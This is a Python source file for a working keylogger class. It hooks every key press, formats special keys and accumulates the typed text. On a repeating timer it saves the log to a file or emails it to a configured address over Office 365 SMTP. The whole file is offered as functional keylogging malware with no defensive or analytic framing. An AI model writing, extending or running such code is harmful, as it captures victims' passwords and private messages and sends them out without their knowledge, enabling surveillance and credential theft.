import keyboard
import smtplib
import logging
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from config.keylogger_config import Config

class KeyloggerModel:
    """Handles keylogging functionality."""
    def __init__(self, interval, method="file"):
        self.interval = interval
        self.method = method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def on_keydown(self, event):
        name = event.name
        if len(name) > 1:
            name = self.format_special_keys(name)
        self.log += name

    def format_special_keys(self, name):
        """Format special keys for logging."""
        if name == "space":
            return " "
        elif name == "enter":
            return "[ENTER]\n"
        elif name == "decimal":
            return "."
        return f"[{name.upper()}]"

    def define_filename(self):
        """Define the log filename based on start and end times."""
        start_dt_str = self.start_dt.strftime("%Y%m%d-%H%M")
        end_dt_str = self.end_dt.strftime("%Y%m%d-%H%M")
        return f"keylog-{start_dt_str}-{end_dt_str}"

    def save_report_to_file(self):
        filename = self.define_filename()
        with open(f"{filename}.txt", "w") as f:
            f.write(self.log)
        logging.info(f"[+] Saved {filename}.txt")

    def prepare_mail(self, message):
        """Prepare the email content."""
        msg = MIMEMultipart("alternative")
        msg["From"] = Config().email_address
        msg["To"] = Config().email_address
        msg["Subject"] = "Keylogger Report"
        msg.attach(MIMEText(message, "plain"))
        return msg.as_string()

    def save_report_to_mail(self):
        """Send the report via email."""
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        try:
            server.login(Config().email_address, Config().email_password)
            server.sendmail(Config().email_address, Config().email_address, self.prepare_mail(self.log))
            logging.info(f"Sent an email with log.")
        finally:
            server.quit()

    def report_logs(self):
        """Log the keys pressed periodically."""
        if self.log:
            self.end_dt = datetime.now()
            if self.method == "email":
                self.save_report_to_mail()
            elif self.method == "file":
                self.save_report_to_file()
            logging.info(f"[{self.define_filename()}] - saved")
            self.start_dt = datetime.now()
        self.log = ""
        Timer(interval=self.interval, function=self.report_logs).start()

    def start(self):
        """Start the keylogger."""
        keyboard.on_press(callback=self.on_keydown)
        self.report_logs()
        logging.info("Keylogger started.")
        keyboard.wait()
